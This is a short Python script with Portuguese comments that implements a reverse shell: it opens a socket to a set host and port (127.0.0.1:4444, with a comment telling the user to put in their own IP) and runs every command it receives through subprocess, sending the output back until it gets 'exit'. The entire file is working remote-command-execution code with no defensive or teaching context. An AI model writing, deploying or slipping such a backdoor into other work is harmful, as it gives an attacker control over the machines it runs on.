import socket
import subprocess

HOST = '127.0.0.1'  # Endereço IP do seu computador
PORT = 4444         # Porta que você deseja usar para a conexão

# Cria o socket e se conecta ao endereço e porta especificados
s = socket.socket()
s.connect((HOST, PORT))

# Executa um shell para receber comandos do servidor
while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

# Fecha a conexão com o servidor
s.close()
